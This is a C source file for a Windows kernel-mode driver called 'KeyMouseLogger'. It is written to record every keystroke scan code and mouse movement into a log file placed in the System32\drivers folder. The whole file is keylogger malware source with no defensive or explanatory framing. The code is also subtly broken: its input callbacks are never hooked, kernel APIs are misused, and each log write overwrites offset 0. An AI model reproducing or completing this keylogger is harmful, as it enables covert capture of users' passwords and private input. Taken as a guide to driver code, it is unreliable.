#include <ntddk.h>
#include <ntifs.h>
#include <wdm.h>
#include <ntstrsafe.h>

#define FILE_DEVICE_KEYLOGGER 0x8000
#define IOCTL_KEYLOGGER_LOG CTL_CODE(FILE_DEVICE_KEYLOGGER, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _KEYBOARD_INPUT_DATA {
    USHORT UnitId;
    USHORT MakeCode;
    USHORT Flags;
    USHORT Reserved;
    ULONG ExtraInformation;
} KEYBOARD_INPUT_DATA, *PKEYBOARD_INPUT_DATA;

typedef struct _MOUSE_INPUT_DATA {
    USHORT UnitId;
    USHORT Flags;
    union {
        ULONG Buttons;
        struct {
            USHORT ButtonFlags;
            USHORT ButtonData;
        };
    };
    ULONG RawButtons;
    LONG LastX;
    LONG LastY;
    ULONG ExtraInformation;
} MOUSE_INPUT_DATA, *PMOUSE_INPUT_DATA;

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath);
VOID DriverUnload(PDRIVER_OBJECT DriverObject);
NTSTATUS CreateDevice(PDRIVER_OBJECT DriverObject);
VOID OnKeyboardInput(PDEVICE_OBJECT DeviceObject, PKEYBOARD_INPUT_DATA InputDataStart, PKEYBOARD_INPUT_DATA InputDataEnd, PULONG InputDataConsumed);
VOID OnMouseInput(PDEVICE_OBJECT DeviceObject, PMOUSE_INPUT_DATA InputDataStart, PMOUSE_INPUT_DATA InputDataEnd, PULONG InputDataConsumed);
NTSTATUS LogToFile(PUNICODE_STRING LogString);

UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\KeyMouseLogger");
UNICODE_STRING SymbolicLinkName = RTL_CONSTANT_STRING(L"\\DosDevices\\KeyMouseLogger");
PDEVICE_OBJECT DeviceObject = NULL;
HANDLE LogFileHandle = NULL;

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    NTSTATUS status = STATUS_SUCCESS;
    UNREFERENCED_PARAMETER(RegistryPath);

    DriverObject->DriverUnload = DriverUnload;
    DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateDevice;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateDevice;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = CreateDevice;

    status = IoCreateDevice(DriverObject, 0, &DeviceName, FILE_DEVICE_KEYLOGGER, FILE_DEVICE_SECURE_OPEN, FALSE, &DeviceObject);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    status = IoCreateSymbolicLink(&SymbolicLinkName, &DeviceName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(DeviceObject);
        return status;
    }

    status = IoRegisterDeviceInterface(DeviceObject, &GUID_DEVINTERFACE_KEYBOARD, NULL, &SymbolicLinkName);
    if (!NT_SUCCESS(status)) {
        IoDeleteSymbolicLink(&SymbolicLinkName);
        IoDeleteDevice(DeviceObject);
        return status;
    }

    status = IoRegisterDeviceInterface(DeviceObject, &GUID_DEVINTERFACE_MOUSE, NULL, &SymbolicLinkName);
    if (!NT_SUCCESS(status)) {
        IoDeleteSymbolicLink(&SymbolicLinkName);
        IoDeleteDevice(DeviceObject);
        return status;
    }

    return status;
}

VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
    if (LogFileHandle) {
        ZwClose(LogFileHandle);
    }
    IoDeleteSymbolicLink(&SymbolicLinkName);
    IoDeleteDevice(DeviceObject);
}

NTSTATUS CreateDevice(PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);
    return STATUS_SUCCESS;
}

VOID OnKeyboardInput(PDEVICE_OBJECT DeviceObject, PKEYBOARD_INPUT_DATA InputDataStart, PKEYBOARD_INPUT_DATA InputDataEnd, PULONG InputDataConsumed) {
    UNREFERENCED_PARAMETER(DeviceObject);
    UNREFERENCED_PARAMETER(InputDataEnd);

    PKEYBOARD_INPUT_DATA inputData = InputDataStart;
    UNICODE_STRING logString;
    WCHAR logBuffer[128];

    if (inputData->Flags & KEY_BREAK) {
        RtlStringCchPrintfW(logBuffer, _countof(logBuffer), L"[KEY UP] MakeCode: 0x%04X\n", inputData->MakeCode);
    } else {
        RtlStringCchPrintfW(logBuffer, _countof(logBuffer), L"[KEY DOWN] MakeCode: 0x%04X\n", inputData->MakeCode);
    }

    RtlInitUnicodeString(&logString, logBuffer);
    LogToFile(&logString);

    *InputDataConsumed = 1;
}

VOID OnMouseInput(PDEVICE_OBJECT DeviceObject, PMOUSE_INPUT_DATA InputDataStart, PMOUSE_INPUT_DATA InputDataEnd, PULONG InputDataConsumed) {
    UNREFERENCED_PARAMETER(DeviceObject);
    UNREFERENCED_PARAMETER(InputDataEnd);

    PMOUSE_INPUT_DATA inputData = InputDataStart;
    UNICODE_STRING logString;
    WCHAR logBuffer[128];

    RtlStringCchPrintfW(logBuffer, _countof(logBuffer), L"[MOUSE] X: %d, Y: %d, Buttons: 0x%04X\n", inputData->LastX, inputData->LastY, inputData->Buttons);
    RtlInitUnicodeString(&logString, logBuffer);
    LogToFile(&logString);

    *InputDataConsumed = 1;
}

NTSTATUS LogToFile(PUNICODE_STRING LogString) {
    NTSTATUS status = STATUS_SUCCESS;
    IO_STATUS_BLOCK ioStatus;
    OBJECT_ATTRIBUTES objectAttributes;
    UNICODE_STRING fileName = RTL_CONSTANT_STRING(L"\\SystemRoot\\System32\\drivers\\logfile.log");
    LARGE_INTEGER byteOffset;

    if (!LogFileHandle) {
        InitializeObjectAttributes(&objectAttributes, &fileName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
        status = ZwCreateFile(&LogFileHandle, FILE_APPEND_DATA, &objectAttributes, &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN_IF, FILE_NON_DIRECTORY_FILE, NULL, 0);
        if (!NT_SUCCESS(status)) {
            return status;
        }
    }

    byteOffset.QuadPart = 0;
    status = ZwWriteFile(LogFileHandle, NULL, NULL, NULL, &ioStatus, LogString->Buffer, LogString->Length, &byteOffset, NULL);
    if (!NT_SUCCESS(status)) {
        ZwClose(LogFileHandle);
        LogFileHandle = NULL;
    }

    return status;
}
